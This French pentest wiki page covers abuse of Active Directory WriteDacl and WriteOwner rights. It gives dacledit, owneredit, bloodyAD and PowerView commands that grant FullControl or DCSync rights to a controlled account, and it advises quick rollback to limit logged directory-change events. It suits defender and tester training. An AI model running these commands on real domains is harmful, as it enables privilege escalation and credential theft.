---
title: "Propriété et réécriture d'ACL : WriteOwner et WriteDacl"
order: 5
description: "Transformer une écriture partielle d'Active Directory en contrôle total : WriteDacl pour ajouter une ACE qui vous accorde des droits, et WriteOwner pour s'approprier la propriété, ainsi que les limites modernes Owner Rights et BlockOwnerImplicitRights qui empêchent la propriété d'impliquer WriteDacl sur les domaines durcis."
keywords:
  - WriteDacl
  - WriteOwner
  - owneredit
  - dacledit
  - Owner Rights
---

# Propriété et réécriture d'ACL

`WriteDacl` et `WriteOwner` sont les méta-droits : ils n'agissent pas sur les données de l'objet, ils vous permettent de **changer qui a des droits dessus**. Avec l'un ou l'autre, vous vous accordez le droit qui vous manque (`GenericAll`, les droits de réplication DCSync, etc.) et vous procédez à partir de là. `WriteDacl` le fait directement ; `WriteOwner` le fait en deux étapes, et sur les domaines modernes cette seconde voie ne fonctionne plus toujours.

## WriteDacl : vous accorder des droits

`WriteDacl` vous permet d'ajouter une ACE à la DACL de l'objet. Ajoutez-en une accordant le contrôle total à un principal que vous contrôlez, ou simplement les droits de réplication pour [DCSync](../authentication/credentials/ntds-and-dcsync.md) :

```bash
# Impacket dacledit.py: write a FullControl ACE for a controlled principal
dacledit.py -action write -rights FullControl -principal 'user' -target 'victim' example.local/user:pass
# or only the DCSync rights, when the target is the domain object
dacledit.py -action write -rights DCSync -principal 'user' -target-dn 'DC=example,DC=local' example.local/user:pass

# bloodyAD equivalents
bloodyAD --host <dc> -d example.local -u user -p pass add genericAll 'victim' 'user'
bloodyAD --host <dc> -d example.local -u user -p pass add dcsync 'user'
```

## WriteOwner : s'approprier la propriété, puis réécrire

`WriteOwner` vous permet de définir le **propriétaire** de l'objet. Historiquement, un propriétaire détenait implicitement `READ_CONTROL` et `WRITE_DAC`, donc s'approprier la propriété vous permettait de réécrire la DACL et de vous accorder le contrôle :

```bash
# Set a controlled principal as owner
owneredit.py -action write -new-owner 'user' -target 'victim' example.local/user:pass
bloodyAD --host <dc> -d example.local -u user -p pass set owner 'victim' 'user'
# then rewrite the DACL as above (dacledit / bloodyAD add genericAll)
```

```powershell
Set-DomainObjectOwner -Identity victim -OwnerIdentity user   # PowerView
```

## La limite Owner Rights (pourquoi WriteOwner peut désormais être une impasse)

S'approprier la propriété n'accorde pas toujours `WRITE_DAC`. Deux mécanismes la contraignent :

- Le **SID `OWNER RIGHTS` (`S-1-3-4`)** : si la DACL de l'objet contient une ACE pour ce SID, elle **remplace** les droits implicites du propriétaire par exactement ce que cette ACE autorise. Une ACE `OWNER RIGHTS` n'accordant que la lecture supprime effectivement le `WRITE_DAC` implicite du propriétaire. Cela s'applique à toute classe d'objet.
- **`BlockOwnerImplicitRights`** (le **29e caractère de `dSHeuristics`**) : lorsqu'il est activé, les droits implicites d'un propriétaire non-admin sont bloqués spécifiquement lorsque l'objet modifié est un **ordinateur** (ou une sous-classe de celui-ci). Il a été introduit pour freiner les prises de contrôle d'objets ordinateur, il neutralise donc surtout `WriteOwner` contre les **comptes machine**, pas les utilisateurs ou les groupes.

En pratique : `WriteOwner` sur un **utilisateur ou un groupe** vous permet encore de vous approprier la propriété puis de réécrire la DACL, sauf si une ACE `OWNER RIGHTS` le restreint. `WriteOwner` sur un **ordinateur** peut être une impasse sur les domaines où `BlockOwnerImplicitRights` est activé. BloodHound signale le cas contraint avec les arêtes **`WriteOwnerLimitedRights`** / **`OwnsLimitedRights`**. Lisez les ACE `OWNER RIGHTS` de la cible (et, pour les ordinateurs, `dSHeuristics`) avant de vous fier au chemin ; là où les droits implicites sont bloqués, il vous faut à la place une arête `WriteDacl` directe.

## Notes d'exploitation

- Préférez une arête `WriteDacl` directe quand vous l'avez ; elle évite entièrement la question des Owner Rights.
- Accordez le **minimum** dont vous avez besoin (DCSync sur le domaine, ou le contrôle total sur un objet) plutôt que des droits larges, et **rétablissez** le propriétaire/la DACL d'origine ensuite : `dacledit.py` et `owneredit.py` prennent tous deux en charge la lecture et la restauration pour que vous puissiez revenir en arrière.
- Éditer un propriétaire ou une DACL génère des événements de changement du service d'annuaire sur le DC qui traite l'opération, enchaînez donc rapidement le changement-usage-retour en arrière.

## Outils

- **Impacket** (`dacledit.py` lecture/écriture/sauvegarde/restauration, `owneredit.py`) : éditions d'ACE et de propriétaire depuis Linux.
- **bloodyAD** (`set owner`, `add genericAll`, `add dcsync`) : octrois en une commande depuis Linux.
- **PowerView** (`Set-DomainObjectOwner`, `Add-DomainObjectAcl`) : éditions en local.

## Références

- SpecterOps: Do You Own Your Permissions, or Do Your Permissions Own You? (Owner Rights, BlockOwnerImplicitRights)
- The Hacker Recipes: WriteDacl and WriteOwner
